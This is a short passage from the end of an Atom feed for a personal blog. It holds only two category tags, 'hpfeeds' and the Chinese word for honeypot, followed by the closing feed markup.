      <category term="hpfeeds" scheme="http://phantom0301.github.io/tags/hpfeeds/"/>
    
      <category term="蜜罐" scheme="http://phantom0301.github.io/tags/%E8%9C%9C%E7%BD%90/"/>
    
  </entry>
  
</feed>
